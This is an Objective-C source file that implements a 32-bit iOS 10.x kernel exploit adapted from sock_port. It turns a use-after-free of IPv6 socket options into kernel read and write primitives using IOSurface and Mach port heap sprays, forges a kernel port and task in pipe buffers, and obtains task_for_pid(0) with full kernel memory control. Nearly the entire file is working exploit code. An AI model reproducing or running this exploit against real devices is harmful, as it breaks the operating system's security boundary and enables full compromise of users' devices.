//
//  s0cket.m
//  socket
//
//  Created by staturnz on 1/24/23.
//  Copyright Â© 2023 Staturnz. All rights reserved.
//
//  sock_port by jakeajames
//  https://github.com/jakeajames/sock_port
//

#import <Foundation/Foundation.h>
#include "s0cket.h"

void status_socket(NSString* str) {
    printf("%s", str.UTF8String);
    NSDictionary* data = @{@"msg": @[str]};
    [[NSNotificationCenter defaultCenter] postNotificationName:@"status" object:nil userInfo:data];
}


#pragma mark - [*]--   IOSurface Stuff   --[*]

mach_vm_size_t pagesize = 0;
int spray_IOSurface(void *data, size_t size) {return !IOSurface_spray_with_gc(32, 256, data, (uint32_t)size, NULL);}

int init_IOSurface(void) {
    kern_return_t ret = KERN_SUCCESS;
    ret = _host_page_size(mach_host_self(), (vm_size_t*)&pagesize);
    status_socket(concat(@"[*] page size: 0x%llx\n", pagesize));
    if (ret != KERN_SUCCESS) {status_socket(concat(@"[-] failed: %s\n", mach_error_string(ret)));return ret;}
    return !IOSurface_init();
}


#pragma mark - [*]--   Read Memory   --[*]

static mach_port_t tfpzero;
size_t kread(uint32_t where, void *p, size_t size) {
    int ret;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) chunk = size - offset;
        ret = mach_vm_read_overwrite(tfpzero, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (ret || sz == 0) {status_socket(concat(@"[-] error on kread(0x%018x)\n", where));break;}
        offset += sz;
    } return offset;
}

uint32_t rk32(uint32_t where) {
    uint32_t out;
    kread(where, &out, sizeof(uint32_t));
    return out;
}


#pragma mark - [*]--   Write Memory   --[*]

size_t kwrite(uint32_t where, const void *p, size_t size) {
    int ret;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) chunk = size - offset;
        ret = mach_vm_write(tfpzero, where + offset, (uint32_t)p + offset, (int)chunk);
        if (ret) {status_socket(concat(@"[-] failed on kwrite: 0x%016x\n", where));break;}

        offset += chunk;
    } return offset;
}

void wk8(uint32_t loc, uint8_t data) {uint32_t _data = data;kwrite(loc, &_data, sizeof(uint8_t));}
void wk16(uint32_t loc, uint16_t data) {uint32_t _data = data;kwrite(loc, &_data, sizeof(uint16_t));}
void wk32(uint32_t loc, uint32_t data) {uint32_t _data = data;kwrite(loc, &_data, sizeof(uint32_t));}


#pragma mark - [*]--   Other Kernel Stuff   --[*]

void init_kernel_memory(mach_port_t tfp0) {tfpzero = tfp0;}

void kfree(mach_vm_address_t address, vm_size_t size) {mach_vm_deallocate(tfpzero, address, size);}

uint32_t kalloc(vm_size_t size) {
    mach_vm_address_t address = 0;
    mach_vm_allocate(tfpzero, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
    return (uint32_t)address;
}

vm_address_t get_k_base(task_t kt) {
    vm_region_submap_info_data_64_t info;
    vm_size_t size;
    mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
    unsigned int depth = 0;
    vm_address_t addr = 0x81200000;

    while (1) {
        if (KERN_SUCCESS != vm_region_recurse_64(kt, &addr, &size, &depth, (vm_region_info_t) & info, &cnt))break;
        if (size > 1024 * 1024 * 1024) {
            pointer_t buf;
            mach_msg_type_number_t sz = 0;
            addr += 0x200000;
            vm_read(kt, addr + 0x1000, 512, &buf, &sz);
            if (*((uint32_t *)buf) != MH_MAGIC) {
                addr-=0x200000;vm_read(kt,addr+0x1000,512,&buf,&sz);if (*((uint32_t*)buf) != MH_MAGIC) break;}
            addr += 0x1000;
            return addr;
        } addr += size;
    }return -1;
}

#pragma mark - [*]--   Funcs for manipulating sockets   --[*]

int set_minmtu(int sock, int *minmtu) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));}

int get_minmtu(int sock, int *minmtu) {socklen_t size = sizeof(*minmtu);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);}

int get_prefertempaddr(int sock, int *prefertempaddr) {socklen_t size = sizeof(*prefertempaddr);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);}

int get_pktinfo(int sock, struct in6_pktinfo *pktinfo) {socklen_t size = sizeof(*pktinfo);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, &size);}

int set_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));}

int free_socket_options(int sock) {return disconnectx(sock, 0, 0);}


#pragma mark - [*]--   Get us UAF sockets   --[*]

int get_socket(void) {
    int sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {status_socket(concat(@"[-] can't get socket: %s\n", strerror(errno)));return -1;}

    struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT};
    int ret = setsockopt(sock, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
    if (ret) {status_socket(concat(@"[-] setsockopt() failed: %s\n", strerror(errno)));return -1;}
    return sock;
}

int get_socket_with_dangling_options(void) {
    int socket = get_socket();
    int minmtu = -1;
    set_minmtu(socket, &minmtu);
    free_socket_options(socket);
    return socket;
}


#pragma mark - [*]--   Funcs for ports n stuff n whatever    --[*]


mach_port_t new_port(void) {
    mach_port_t port;
    kern_return_t rv = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (rv) {status_socket(concat(@"[-] failed to allocate port: %s\n", mach_error_string(rv)));return MACH_PORT_NULL;}
    rv = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (rv) {status_socket(concat(@"[-] Failed to insert right: %s\n", mach_error_string(rv)));return MACH_PORT_NULL;}
    return port;
}


uint32_t find_port(mach_port_name_t port, uint32_t task_self) {
    uint32_t task_addr = rk32(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint32_t itk_space = rk32(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint32_t is_table = rk32(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = koffset(KSTRUCT_SIZE_IPC_ENTRY);
    uint32_t port_addr = rk32(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition) {
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {status_socket(@"[-] failed to allocate port\n");return 0;}

    
    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) ports[i] = target_port;
    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0xdeadbeef;
    msg->body.msgh_descriptor_count = 1;
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,MACH_SEND_MSG|MACH_MSG_OPTION_NONE,msg->hdr.msgh_size,
                   0,MACH_PORT_NULL,MACH_MSG_TIMEOUT_NONE,MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {status_socket(concat(@"[-] failed to send msg: %s\n", mach_error_string(err)));return MACH_PORT_NULL;}
    return q;
}


#pragma mark - [*]--   Primitive One    --[*]

uint32_t find_port_via_uaf(mach_port_t port, int disposition) {
    int sock = get_socket_with_dangling_options();
    for (int i = 0; i < 0x10000; i++) {
        mach_port_t p = fill_kalloc_with_port_pointer(port, (sizeof(struct ip6_pktopts) - 7) / sizeof(uint32_t), MACH_MSG_TYPE_COPY_SEND);
        int mtu;int pref;
        get_minmtu(sock, &mtu);
        get_prefertempaddr(sock, &pref);
        uint32_t ptr = mtu;
        if (mtu != 0xffffffff && mtu != 0 && pref != 0xdeadbeef && mtu == pref) {
            mach_port_destroy(mach_task_self(), p);
            close(sock);
            return ptr;}
        mach_port_destroy(mach_task_self(), p);
    }
    close(sock);
    return 0;
}

uint32_t task_self_addr(void) {
    static uint32_t cached_task_self_addr = 0;
    if (cached_task_self_addr) { return cached_task_self_addr;
    } else {
        cached_task_self_addr = find_port_via_uaf(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
        return cached_task_self_addr;
    }
}

#pragma mark - [*]--   Primitive Two & Three    --[*]

void* primitive(uint32_t addr, bool read) {
    int sockets[128];
    for (int i = 0; i < 128; i++) sockets[i] = get_socket_with_dangling_options();
    struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    fake_opts->ip6po_minmtu = 0x13371337;
    *(uint32_t*)((uint64_t)fake_opts + 116) = 0x13371337;
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;
    bool found = false;
    int found_at = -1;
    
    for (int i = 0; i < 20; i++) {
        spray_IOSurface((void *)fake_opts, sizeof(struct ip6_pktopts) - 8);
        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == 0x13371337) {found_at = j; found = true; break;}
        }
        if (found) break;
    }
    free(fake_opts);
    
    if (!found) {status_socket(@"[-] failed to read kernel\n");return 0;}
    for (int i = 0; i < 128; i++) if (i != found_at) {close(sockets[i]);}
    if (read) {
        void *buf = malloc(sizeof(struct in6_pktinfo));
        get_pktinfo(sockets[found_at], (struct in6_pktinfo *)buf);
        close(sockets[found_at]);return buf;
    } else {
        struct in6_pktinfo *buf = malloc(sizeof(struct in6_pktinfo));
        memset(buf, 0, sizeof(struct in6_pktinfo));
        set_pktinfo(sockets[found_at], buf);free(buf);
    }
    return 0;
}

uint32_t rk32_via_uaf(uint32_t addr) {
    void *buf = primitive(addr, true);
    if (buf) {uint32_t r = *(uint32_t*)buf;free(buf);return r;}
    return 0;
}

static inline uint32_t mach_port_waitq_flags() {
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type              = WQT_QUEUE;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

#pragma mark - [*]--   Init Stuff    --[*]

bool init_s0cket(void) {
    if (UINTPTR_MAX == 0xffffffffffffffff) {status_socket(@"[-] arm64 not supported\n"); return false;}
    int off_ret = offsets_init();
    if (!off_ret) {status_socket(@"[-] failed to get offsets"); return false;}
    status_socket(@"[*] found offsets for 10.x\n");

    kern_return_t kern_ret = init_IOSurface();
    if (kern_ret) {status_socket(@"[-] IOSurface init: failed\n");return false;}
    status_socket(@"[*] IOSurface init: success\n");

    
    return true;
}

#pragma mark - [*]--   Gets us task_for_pid(0)    --[*]

uint32_t self_port_addr;
mach_port_t s0cket() {
    clock_t t;
    t = clock();

    int ret = init_s0cket();
    if (!ret) {return MACH_PORT_NULL;}
    
    self_port_addr = task_self_addr();
    if (!self_port_addr) {status_socket(@"[-] failed to leak our task port address!\n");goto err;}
    
    status_socket(concat(@"[*] task_port: 0x%x\n", self_port_addr));
    uint32_t ipc_space_kernel = rk32_via_uaf(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    if (!ipc_space_kernel) {status_socket(@"[-] kread primitive: failed\n");goto err;}
    status_socket(concat(@"[*] ipc_space_kernel: 0x%x\n", ipc_space_kernel));

    int fds[2];
    ret = pipe(fds);
    if (ret) {status_socket(@"[-] create pipe: failed\n");goto err;}
    
    static const size_t pipebuf_size = 0x8000;
    static uint8_t pipebuf[pipebuf_size];
    memset(pipebuf, 0, pipebuf_size);
    
    write(fds[1], pipebuf, pipebuf_size);
    read(fds[0], pipebuf, pipebuf_size);
    write(fds[1], pipebuf, sizeof(uint32_t));
    
    int port_fds[2] = {-1, -1};
    ret = pipe(port_fds);
    if (ret) {status_socket(@"[-] create pipe: failed\n");goto err;}
    
    size_t fake_task_size = round_page_kernel(0x3b0);
    kport_t *fakeport = malloc(sizeof(kport_t) + fake_task_size);
    ktask_t *fake_task = (ktask_t *)((uint32_t)fakeport + sizeof(kport_t));
    bzero((void *)fakeport, sizeof(kport_t) + fake_task_size);
    
    fake_task->ref_count = 0xff;
    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fakeport->ip_references = 0xd00d;
    fakeport->ip_lock.type = 0x11;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = 0;
    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fakeport->ip_srights = 99;
    fakeport->ip_kobject = 0;
    fakeport->ip_receiver = ipc_space_kernel;

    write(port_fds[1], (void *)fakeport, sizeof(kport_t) + fake_task_size);
    read(port_fds[0], (void *)fakeport, sizeof(kport_t) + fake_task_size);
    
    uint32_t task = rk32_check(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint32_t proc = rk32_check(task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    uint32_t p_fd = rk32_check(proc + koffset(KSTRUCT_OFFSET_PROC_P_FD));
    uint32_t fd_ofiles = rk32_check(p_fd + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
    uint32_t fproc = rk32_check(fd_ofiles + fds[0] * sizeof(uint32_t));
    uint32_t f_fglob = rk32_check(fproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
    uint32_t fg_data = rk32_check(f_fglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
    uint32_t pipe_buffer = rk32_check(fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER));
    status_socket(concat(@"[*] pipe buf: 0x%x\n", pipe_buffer));

    uint32_t port_fg_data = 0;
    uint32_t port_pipe_buffer = 0;
    
    fproc = rk32_check(fd_ofiles + port_fds[0] * sizeof(uint32_t));
    f_fglob = rk32_check(fproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
    port_fg_data = rk32_check(f_fglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
    port_pipe_buffer = rk32_check(port_fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER));
    status_socket(concat(@"[*] second pipe buf: 0x%x\n", port_pipe_buffer));

    fakeport->ip_kobject = port_pipe_buffer + sizeof(kport_t);
    write(port_fds[1], (void *)fakeport, sizeof(kport_t) + fake_task_size);
    
    mach_port_t target = new_port();
    if (!target) {status_socket(@"[-] alloc port: failed\n");goto err;}
    uint32_t target_addr = find_port_via_uaf(target, MACH_MSG_TYPE_COPY_SEND);
    if (!target_addr) {status_socket(@"[-] failed to leak target port address\n");goto err;}
    primitive(pipe_buffer, false);
    
    mach_port_t p = MACH_PORT_NULL;
    for (int i = 0; i < 10000; i++) {
        p = fill_kalloc_with_port_pointer(target, pipebuf_size/sizeof(uint32_t), MACH_MSG_TYPE_COPY_SEND);
        uint32_t addr;
        read(fds[0], &addr, sizeof(uint32_t));
        if (addr == target_addr) {break;}
        write(fds[1], &addr, sizeof(uint32_t));
        mach_port_destroy(mach_task_self(), p);
        p = MACH_PORT_NULL;
    }

    if (!p) {status_socket(@"[-] spray: failed!");goto err;}
    write(fds[1], &port_pipe_buffer, sizeof(uint32_t));
    struct ool_msg *msg = malloc(0x1000);
    ret = mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, p, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (ret) {free(msg);status_socket(concat(@"[-] mach_msg() failed: %s\n", mach_error_string(ret)));goto err;}
    
    mach_port_t *received_ports = msg->ool_ports.address;
    mach_port_t our_port = received_ports[0];
    free(msg);
    uint32_t *read_addr_ptr = (uint32_t *)((uint32_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    
    uint32_t struct_task;
    kr32(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), struct_task);
    if (!struct_task) {status_socket(@"[-] kread: failed\n");goto err;}
    status_socket(concat(@"[*] struct_task: 0x%x\n", struct_task));
    uint32_t kernel_vm_map = 0;
    
    while (struct_task != 0) {
        uint32_t bsd_info;
        kr32(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO), bsd_info);
        if (!bsd_info) {status_socket(@"[-] kread: failed\n");goto err;}
        uint32_t pid;
        kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID), pid);

        if (pid == 0) {
            uint32_t vm_map;
            kr32(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP), vm_map);
            if (!vm_map) {status_socket(@"[-] kread: failed\n");goto err;}
            kernel_vm_map = vm_map;break;
        } kr32(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV), struct_task);
    }
    
    if (!kernel_vm_map) {status_socket(@"[-] kernel_vm_map: failed\n");goto err;}
    status_socket(concat(@"[*] kernel_vm_map: 0x%x\n", kernel_vm_map));

    read(port_fds[0], (void *)fakeport, sizeof(kport_t) + fake_task_size);
    
    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 100;
    fake_task->active = 1;
    fake_task->map = kernel_vm_map;
    
    *(uint32_t *)((uint32_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_ITK_SELF)) = 1;
    write(port_fds[1], (void *)fakeport, sizeof(kport_t) + fake_task_size);
    init_kernel_memory(our_port);
    uint32_t addr = (uint32_t)kalloc(8);
    if (!addr) {status_socket(@"[-] seems like tfp0 port didn't work?\n");goto err;}
    
    status_socket(concat(@"[*] allocated: 0x%x\n", addr));
    wk32(addr, 0xdeadbeef);
    uint32_t readb = rk32(addr);
    kfree(addr, 4);
    status_socket(concat(@"[*] read back: 0x%x\n", readb));

    if (readb != 0xdeadbeef) {status_socket(@"[-] read back value didn't match\n");goto err;}
    
    status_socket(@"[*] creating safer port\n");
    mach_port_t new_tfp0 = new_port();
    if (!new_tfp0) {status_socket(@"[-] failed to allocate new tfp0 port\n");goto err;}
    
    uint32_t new_addr = find_port(new_tfp0, self_port_addr);
    if (!new_addr) {status_socket(@"[-] failed to find new tfp0 port address\n");goto err;}
    
    uint32_t faketask = (uint32_t)kalloc(fake_task_size);
    if (!faketask) {status_socket(@"[-] failed to kalloc fake_task\n");goto err;}
    
    kwrite(faketask, fake_task, fake_task_size);
    fakeport->ip_kobject = faketask;
    kwrite(new_addr, (const void*)fakeport, sizeof(kport_t));
    
    status_socket(@"[*] testing new tfp0 port\n");
    init_kernel_memory(new_tfp0);
    addr = (uint32_t)kalloc(8);
    if (!addr) {status_socket(@"[-] seems like the new tfp0 port didn't work?\n");goto err;}
    
    status_socket(concat(@"[+] tfp0: 0x%x\n", new_tfp0));
    status_socket(concat(@"[*] allocated: 0x%x\n", addr));
    wk32(addr, 0xdeadbeef);
    readb = rk32(addr);
    kfree(addr, 4);
    status_socket(concat(@"[*] read back: 0x%x\n", readb));
    if (readb != 0xdeadbeef) {status_socket(@"[-] read back value didn't match\n");goto err;}
    
    uint32_t task_addr = rk32(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint32_t itk_space = rk32(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint32_t is_table = rk32(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    uint32_t port_index = our_port >> 8;
    const int sizeof_ipc_entry_t = koffset(KSTRUCT_SIZE_IPC_ENTRY);
    
    wk32(is_table + (port_index * sizeof_ipc_entry_t) + sizeof(uint32_t), 0);
    wk32(is_table + (port_index * sizeof_ipc_entry_t), 0);
    wk32(fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER), 0);
    
    if (fds[0] > 0)  close(fds[0]);
    if (fds[1] > 0)  close(fds[1]);
    if (port_fds[0] > 0)  close(port_fds[0]);
    if (port_fds[1] > 0)  close(port_fds[1]);
    
    free((void *)fakeport);
    IOSurface_deinit();
    t = clock() - t;
    double runtime = ((double)t)/CLOCKS_PER_SEC;
    status_socket(concat(@"[*] tfp0 in %f sec\n", runtime));
    return new_tfp0;

err:
    if (port_fds[0] > 0)  close(port_fds[0]);
    if (port_fds[1] > 0)  close(port_fds[1]);
    IOSurface_deinit();
    return MACH_PORT_NULL;
}
